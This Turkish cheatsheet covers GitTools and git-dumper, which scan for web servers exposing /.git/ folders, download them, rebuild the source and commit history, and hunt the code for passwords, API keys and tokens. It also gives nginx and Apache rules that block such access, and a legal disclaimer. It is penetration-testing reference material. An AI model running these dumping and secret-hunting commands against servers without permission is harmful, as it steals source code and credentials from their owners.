# 📂 GitTools - Kapsamlı Başvuru Rehberi (Cheatsheet)

[🇺🇸 English Version](../README.md)

```
   ██████╗ ██╗████████╗████████╗ ██████╗  ██████╗ ██╗     ███████╗
  ██╔════╝ ██║╚══██╔══╝╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
  ██║  ███╗██║   ██║      ██║   ██║   ██║██║   ██║██║     ███████╗
  ██║   ██║██║   ██║      ██║   ██║   ██║██║   ██║██║     ╚════██║
  ╚██████╔╝██║   ██║      ██║   ╚██████╔╝╚██████╔╝███████╗███████║
   ╚═════╝ ╚═╝   ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
     Dışa Açık /.git/ Depolarını İndirme, Kaynak Kod Kurtarma ve Secret Avı
```

<p align="center">
  <img src="https://img.shields.io/badge/GitTools-Git_Dökümü-blue?style=for-the-badge" alt="GitTools">
  <img src="https://img.shields.io/badge/Yazar-Internetwache-orange?style=for-the-badge" alt="internetwache">
  <img src="https://img.shields.io/badge/Kategori-Web_Güvenliği_&_Secret-green?style=for-the-badge" alt="Web Security">
  <img src="https://img.shields.io/badge/Lisans-MIT-purple?style=for-the-badge" alt="MIT">
</p>

<p align="center">
  <b>📂 Web sunucularında yanlışlıkla dış dünyaya açık bırakılan <code>/.git/</code> klasörlerini tespit eden, ham Git nesnelerini indirip orijinal kaynak kodunu ve geçmiş commit'leri kurtaran araç kiti</b>
</p>

---

## 📋 İçindekiler

- [Genel Bakış ve Dışa Açık .git Tehlikesi](#-genel-bakış-ve-dışa-açık-git-tehlikesi)
- [Kurulum](#-kurulum)
- [GitTools Modülleri](#-gittools-modülleri)
  - [1. Dumper (`gitdumper.sh`)](#1-dumper-gitdumpersh)
  - [2. Extractor (`extractor.sh`)](#2-extractor-extractorsh)
  - [3. Finder (`finder.py`)](#3-finder-finderpy)
- [Python Alternatifi: `git-dumper`](#-python-alternatifi-git-dumper)
- [Kurtarılan Kodda Gizli Bilgi (Secret) Avı](#-kurtarılan-kodda-gizli-bilgi-secret-avı)
- [Hızlı Referans Tablosu](#-hızlı-referans-tablosu)
- [Savunma Yöntemleri ve Web Sunucusu Sıkılaştırma](#-savunma-yöntemleri-ve-web-sunucusu-sıkılaştırma)
- [Yasal Uyarı](#-yasal-uyarı)

---

## 🎯 Genel Bakış ve Dışa Açık .git Tehlikesi

Geliştiriciler web uygulamalarını doğrudan `git clone` ile sunucuya yüklediğinde veya `.git` dizinini web kökünden temizlemediğinde, bu gizli klasör internete açılır:
`https://hedef.com/.git/`

Dizin listeleme (directory listing) kapalı olsa bile, Git'in deterministik dosya yapısı sayesinde (`/.git/HEAD`, `/.git/config`, `/.git/index` ve `.git/objects/xx/xxxx...`) tüm nesneler indirilebilir. Bunun sonucunda:
- Tüm uygulama kaynak kodları ve API uç noktaları ele geçirilir.
- Ayar dosyalarında saklanan veritabanı şifreleri, API token'ları ve SSH gizli anahtarları açığa çıkar.
- Tüm commit geçmişi, silinmiş eski kodlar ve yazılımcı e-posta adresleri dökülür.

---

## 📥 Kurulum

```bash
# GitTools deposunu klonlama
git clone https://github.com/internetwache/GitTools.git
cd GitTools
chmod +x Dumper/gitdumper.sh Extractor/extractor.sh

# Bağımsız Python git-dumper aracını pip ile kurma
pip install git-dumper
```

---

## 🚀 GitTools Modülleri

GitTools üç özel araçtan oluşur:

### 1. Dumper (`gitdumper.sh`)
Web sunucusundan indirilebilecek tüm `.git` dosyalarını yerel klasöre çeker:
```bash
# Kullanım: ./gitdumper.sh <GIT_URL> <KAYDEDILECEK_DIZIN>
./Dumper/gitdumper.sh https://hedef.com/.git/ /tmp/hedef_repo/
```

### 2. Extractor (`extractor.sh`)
İndirilen ham Git nesnelerini ayrıştırarak orijinal kaynak kod dosyalarını ve commit ağacını yeniden oluşturur:
```bash
# Kullanım: ./extractor.sh <DUMP_DIZINI> <KAYNAK_KOD_DIZINI>
./Extractor/extractor.sh /tmp/hedef_repo/ /tmp/kaynak_kodlar/
```
`/tmp/kaynak_kodlar/` dizininde her bir commit numarası için ayrı klasörler açılır ve o commit anındaki tüm dosyalar eksiksiz kurtarılır.

### 3. Finder (`finder.py`)
Geniş hedef listelerinde açık `.git` dizini arar:
```bash
python3 Finder/finder.py -i hedefler.txt -u "Mozilla/5.0"
```

---

## 🐍 Python Alternatifi: `git-dumper`

`git-dumper`, indirme ve çalışan bir git deposu oluşturma işlemlerini tek adımda otomatik yapan çok iş parçacıklı modern bir Python aracıdır:

```bash
# Tek komutla indirip çalışan yerel bir git deposu inşa etme
git-dumper https://hedef.com/.git/ ./kurtarilan_repo/

# Proxy (Burp Suite / SOCKS) üzerinden çalıştırma
git-dumper --proxy http://127.0.0.1:8080 https://hedef.com/.git/ ./kurtarilan_repo/
```

İşlem tamamlandıktan sonra klasöre girip normal `git` komutlarıyla inceleme yapabilirsiniz:
```bash
cd ./kurtarilan_repo/
git log -p              # Tüm commit geçmişini ve yapılan değişiklikleri inceleme
git status              # Takip edilmeyen dosyaları görme
git branch -a           # Tüm dalları listeleme
```

---

## 🔍 Kurtarılan Kodda Gizli Bilgi (Secret) Avı

Kaynak kod kurtarıldıktan sonra parola ve anahtar avı başlatın:

```bash
cd ./kurtarilan_repo/

# Regex ile kritik kelimeleri arama
grep -Erio "password|secret|api_key|token|AWS" .

# Gitleaks ve TruffleHog ile otomatik tarama
gitleaks detect -v
trufflehog git file://$(pwd)
```

---

## ⚡ Hızlı Referans Tablosu

| Amaç | Komut |
|------|-------|
| **git-dumper ile Otomatik Çek** | `git-dumper https://hedef.com/.git/ ./repo/` |
| **GitTools Bash Dumper** | `./Dumper/gitdumper.sh https://hedef.com/.git/ ./dump/` |
| **Commit'lerden Kod Kurtar** | `./Extractor/extractor.sh ./dump/ ./kaynak/` |
| **Açık .git Dizinlerini Tara**| `python3 Finder/finder.py -i domainler.txt` |
| **Geçmiş Değişiklikleri Gör** | `git log -p --color` |
| **Gizli Parolaları Tara** | `gitleaks detect -v` |

---

## 🛡️ Savunma Yöntemleri ve Web Sunucusu Sıkılaştırma

1. **Nginx Yapılandırması:**
   ```nginx
   location ~ /\.git {
       deny all;
       return 404;
   }
   ```
2. **Apache Yapılandırması (`.htaccess`):**
   ```apache
   RedirectMatch 404 /\.git
   ```
3. **CI/CD Dağıtım Kuralları:** Kodları canlı sunucuya doğrudan `git clone` ile çekmeyin; derlenmiş ve temizlenmiş dağıtım paketleri veya Docker imajları kullanın.

---

## ⚠️ Yasal Uyarı

> [!CAUTION]
> GitTools ve git-dumper yalnızca yasal izin alınmış sızma testleri ve güvenlik denetimleri için kullanılmalıdır. İzniniz olmayan web sunucularından tescilli kaynak kodları indirmek telif hakları ve siber güvenlik yasalarına aykırıdır.
